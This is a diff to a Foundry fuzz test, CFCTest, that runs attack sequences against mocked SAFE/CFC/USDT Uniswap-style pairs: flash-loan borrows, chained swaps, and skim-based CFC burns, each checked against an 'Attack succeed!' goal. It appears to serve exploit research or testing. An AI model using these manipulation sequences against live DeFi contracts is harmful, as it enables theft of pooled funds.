@@ -16,7 +16,7 @@ contract CFCTest is Test, BlockLoader {
     SAFE safe;
     CFC cfc;
     UniswapV2Pair safeusdtPair;
-    UniswapV2Pair CakeLP;
+    UniswapV2Pair pair;
     USDTCFC usdtcfc;
     UniswapV2Factory factory;
     UniswapV2Router router;
@@ -27,7 +27,7 @@ contract CFCTest is Test, BlockLoader {
     address safeAddr;
     address cfcAddr;
     address safeusdtPairAddr;
-    address CakeLPAddr;
+    address pairAddr;
     address usdtcfcAddr;
     address factoryAddr;
     address routerAddr;
@@ -41,25 +41,24 @@ contract CFCTest is Test, BlockLoader {
         1289939749702297086941886408175762837312088370;
     uint256 price1CumulativeLastsafeusdtPair =
         19813834967984668036434544980989284471792;
-    uint112 reserve0CakeLP = 3466655815335789642356;
-    uint112 reserve1CakeLP = 100246518127533892079722;
-    uint32 blockTimestampLastCakeLP = 1686812598;
-    uint256 kLastCakeLP = 548155965428649915691831589164812341266909168;
-    uint256 price0CumulativeLastCakeLP =
+    uint112 reserve0pair = 3466655815335789642356;
+    uint112 reserve1pair = 100246518127533892079722;
+    uint32 blockTimestampLastpair = 1686812598;
+    uint256 kLastpair = 548155965428649915691831589164812341266909168;
+    uint256 price0CumulativeLastpair =
         210605282325395173002590957195716466715171;
-    uint256 price1CumulativeLastCakeLP =
-        272801197874040290279645040961546599365;
+    uint256 price1CumulativeLastpair = 272801197874040290279645040961546599365;
     uint256 totalSupplysafe = 931155431591721766722529;
     uint256 balanceOfsafesafeusdtPair = 97465121886619415513006;
-    uint256 balanceOfsafeCakeLP = 3466655815335789642356;
+    uint256 balanceOfsafepair = 3466655815335789642356;
     uint256 balanceOfsafeattacker = 0;
     uint256 totalSupplycfc = 3100000000000000000000000;
     uint256 balanceOfcfcsafeusdtPair = 0;
-    uint256 balanceOfcfcCakeLP = 100246518127533892079722;
+    uint256 balanceOfcfcpair = 100246518127533892079722;
     uint256 balanceOfcfcattacker = 0;
     uint256 totalSupplyusdt = 3379997906401637314353418691;
     uint256 balanceOfusdtsafeusdtPair = 489503510554930476393732;
-    uint256 balanceOfusdtCakeLP = 0;
+    uint256 balanceOfusdtpair = 0;
     uint256 balanceOfusdtattacker = 0;
 
     function setUp() public {
@@ -83,21 +82,21 @@ contract CFCTest is Test, BlockLoader {
             price1CumulativeLastsafeusdtPair
         );
         safeusdtPairAddr = address(safeusdtPair);
-        CakeLP = new UniswapV2Pair(
+        pair = new UniswapV2Pair(
             address(safe),
             address(cfc),
-            reserve0CakeLP,
-            reserve1CakeLP,
-            blockTimestampLastCakeLP,
-            kLastCakeLP,
-            price0CumulativeLastCakeLP,
-            price1CumulativeLastCakeLP
+            reserve0pair,
+            reserve1pair,
+            blockTimestampLastpair,
+            kLastpair,
+            price0CumulativeLastpair,
+            price1CumulativeLastpair
         );
-        CakeLPAddr = address(CakeLP);
+        pairAddr = address(pair);
         factory = new UniswapV2Factory(
             address(0xdead),
             address(safeusdtPair),
-            address(CakeLP),
+            address(pair),
             address(0x0)
         );
         factoryAddr = address(factory);
@@ -109,9 +108,9 @@ contract CFCTest is Test, BlockLoader {
         // Initialize balances and mock flashloan.
         usdt.transfer(address(safeusdtPair), balanceOfusdtsafeusdtPair);
         safe.transfer(address(safeusdtPair), balanceOfsafesafeusdtPair);
-        safe.transfer(address(CakeLP), balanceOfsafeCakeLP);
-        cfc.transfer(address(CakeLP), balanceOfcfcCakeLP);
-        cfc.afterDeploy(address(router), address(CakeLP));
+        safe.transfer(address(pair), balanceOfsafepair);
+        cfc.transfer(address(pair), balanceOfcfcpair);
+        cfc.afterDeploy(address(router), address(pair));
     }
 
     modifier eurus() {
@@ -168,22 +167,18 @@ contract CFCTest is Test, BlockLoader {
             cfc.decimals()
         );
         emit log_string("");
-        emit log_string("Cakelp Balances: ");
+        emit log_string("Pair Balances: ");
         queryERC20BalanceDecimals(
             address(usdt),
-            address(CakeLP),
+            address(pair),
             usdt.decimals()
         );
         queryERC20BalanceDecimals(
             address(safe),
-            address(CakeLP),
+            address(pair),
             safe.decimals()
         );
-        queryERC20BalanceDecimals(
-            address(cfc),
-            address(CakeLP),
-            cfc.decimals()
-        );
+        queryERC20BalanceDecimals(address(cfc), address(pair), cfc.decimals());
         emit log_string("");
         emit log_string("Usdtcfc Balances: ");
         queryERC20BalanceDecimals(
@@ -276,28 +271,28 @@ contract CFCTest is Test, BlockLoader {
         safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
     }
 
-    function swap_CakeLP_attacker_safe_cfc(
+    function swap_pair_attacker_safe_cfc(
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
-        safe.transfer(address(CakeLP), amount);
-        CakeLP.swap(0, amountOut, attacker, new bytes(0));
+        safe.transfer(address(pair), amount);
+        pair.swap(0, amountOut, attacker, new bytes(0));
     }
 
-    function swap_CakeLP_attacker_cfc_safe(
+    function swap_pair_attacker_cfc_safe(
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
-        cfc.transfer(address(CakeLP), amount);
-        CakeLP.swap(amountOut, 0, attacker, new bytes(0));
+        cfc.transfer(address(pair), amount);
+        pair.swap(amountOut, 0, attacker, new bytes(0));
     }
 
-    function burn_cfc_CakeLP(uint256 amount) internal eurus {
-        cfc.transfer(address(CakeLP), amount);
-        CakeLP.skim(attacker);
-        amount /= 15;
-        cfc.transfer(address(CakeLP), amount);
-        CakeLP.skim(attacker);
+    function burn_cfc_pair(uint256 amount) internal eurus {
+        cfc.transfer(address(pair), amount);
+        pair.skim(attacker);
+        amount /= 2;
+        cfc.transfer(address(pair), amount);
+        pair.skim(attacker);
     }
 
     function swap_usdtcfc_attacker_usdt_cfc(
@@ -307,10 +302,10 @@ contract CFCTest is Test, BlockLoader {
         usdt.transfer(address(safeusdtPair), amount);
         safeusdtPair.swap(amountOut, 0, attacker, new bytes(0));
         uint256 amountOfSafe = safe.balanceOf(attacker);
-        safe.transfer(address(CakeLP), safe.balanceOf(attacker));
-        CakeLP.swap(
+        safe.transfer(address(pair), safe.balanceOf(attacker));
+        pair.swap(
             1,
-            CakeLP.getAmountOut(amountOfSafe, address(safe)),
+            pair.getAmountOut(amountOfSafe, address(safe)),
             attacker,
             new bytes(0)
         );
@@ -320,11 +315,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amount,
         uint256 amountOut
     ) internal eurus {
-        cfc.transfer(address(CakeLP), amount);
-        CakeLP.swap(amountOut, 0, attacker, new bytes(0));
-        amountOut /= 3;
-        cfc.transfer(address(CakeLP), amount);
-        CakeLP.swap(amountOut, 0, attacker, new bytes(0));
+        cfc.transfer(address(pair), amount);
+        pair.swap(amountOut, 0, attacker, new bytes(0));
         uint256 amountOfSafe = safe.balanceOf(attacker);
         safe.transfer(address(safeusdtPair), safe.balanceOf(attacker));
         safeusdtPair.swap(
@@ -344,12 +336,14 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt5
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt5 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -362,12 +356,14 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt5
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt5 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -380,12 +376,14 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt5
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt5 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
         payback_safe_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -398,12 +396,14 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt5
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt5 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
         payback_cfc_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -418,13 +418,15 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt7
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt7 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -440,14 +442,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt8
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt8 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        burn_cfc_CakeLP(amt3);
-        swap_CakeLP_attacker_safe_cfc(amt4, amt5);
+        burn_cfc_pair(amt3);
+        swap_pair_attacker_safe_cfc(amt4, amt5);
         swap_usdtcfc_attacker_cfc_usdt(amt6, amt7);
         payback_usdt_owner(amt8);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -464,14 +468,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -486,13 +492,15 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt7
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt7 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -508,14 +516,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt8
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt8 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        burn_cfc_CakeLP(amt3);
-        swap_CakeLP_attacker_cfc_safe(amt4, amt5);
+        burn_cfc_pair(amt3);
+        swap_pair_attacker_cfc_safe(amt4, amt5);
         swap_safeusdtPair_attacker_safe_usdt(amt6, amt7);
         payback_usdt_owner(amt8);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -532,14 +542,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -554,13 +566,15 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt7
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt7 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
         payback_safe_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -576,14 +590,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt8
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt8 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        burn_cfc_CakeLP(amt5);
-        swap_CakeLP_attacker_cfc_safe(amt6, amt7);
+        burn_cfc_pair(amt5);
+        swap_pair_attacker_cfc_safe(amt6, amt7);
         payback_safe_owner(amt8);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -600,14 +616,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
         payback_safe_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -622,13 +640,15 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt7
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt7 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
         payback_safe_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -644,14 +664,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt8
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt8 >= amt0);
         borrow_safe_owner(amt0);
-        burn_cfc_CakeLP(amt1);
-        swap_CakeLP_attacker_safe_cfc(amt2, amt3);
+        burn_cfc_pair(amt1);
+        swap_pair_attacker_safe_cfc(amt2, amt3);
         swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
         swap_safeusdtPair_attacker_usdt_safe(amt6, amt7);
         payback_safe_owner(amt8);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -668,14 +690,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
         payback_safe_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -690,13 +714,15 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt7
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt7 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
         payback_cfc_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -712,14 +738,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt8
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt8 >= amt0);
         borrow_cfc_owner(amt0);
-        burn_cfc_CakeLP(amt1);
-        swap_CakeLP_attacker_cfc_safe(amt2, amt3);
+        burn_cfc_pair(amt1);
+        swap_pair_attacker_cfc_safe(amt2, amt3);
         swap_safeusdtPair_attacker_safe_usdt(amt4, amt5);
         swap_usdtcfc_attacker_usdt_cfc(amt6, amt7);
         payback_cfc_owner(amt8);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -736,14 +764,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
         payback_cfc_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -758,13 +788,15 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt7
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt7 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
         payback_cfc_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -780,14 +812,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt8
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt8 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        burn_cfc_CakeLP(amt5);
-        swap_CakeLP_attacker_safe_cfc(amt6, amt7);
+        burn_cfc_pair(amt5);
+        swap_pair_attacker_safe_cfc(amt6, amt7);
         payback_cfc_owner(amt8);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -804,14 +838,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
         payback_cfc_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -828,6 +864,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
@@ -835,7 +873,7 @@ contract CFCTest is Test, BlockLoader {
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -852,6 +890,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
@@ -859,7 +899,7 @@ contract CFCTest is Test, BlockLoader {
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -876,14 +916,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -901,15 +943,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        burn_cfc_CakeLP(amt3);
-        swap_CakeLP_attacker_safe_cfc(amt4, amt5);
-        swap_CakeLP_attacker_cfc_safe(amt6, amt7);
+        burn_cfc_pair(amt3);
+        swap_pair_attacker_safe_cfc(amt4, amt5);
+        swap_pair_attacker_cfc_safe(amt6, amt7);
         swap_safeusdtPair_attacker_safe_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -927,15 +971,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
-        burn_cfc_CakeLP(amt5);
-        swap_CakeLP_attacker_cfc_safe(amt6, amt7);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
+        burn_cfc_pair(amt5);
+        swap_pair_attacker_cfc_safe(amt6, amt7);
         swap_safeusdtPair_attacker_safe_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -954,15 +1000,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -979,14 +1027,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1004,15 +1054,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        burn_cfc_CakeLP(amt3);
-        swap_CakeLP_attacker_cfc_safe(amt4, amt5);
-        swap_CakeLP_attacker_safe_cfc(amt6, amt7);
+        burn_cfc_pair(amt3);
+        swap_pair_attacker_cfc_safe(amt4, amt5);
+        swap_pair_attacker_safe_cfc(amt6, amt7);
         swap_usdtcfc_attacker_cfc_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1030,15 +1082,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
-        burn_cfc_CakeLP(amt5);
-        swap_CakeLP_attacker_safe_cfc(amt6, amt7);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
+        burn_cfc_pair(amt5);
+        swap_pair_attacker_safe_cfc(amt6, amt7);
         swap_usdtcfc_attacker_cfc_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1057,15 +1111,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1082,6 +1138,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
@@ -1089,7 +1147,7 @@ contract CFCTest is Test, BlockLoader {
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1106,6 +1164,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
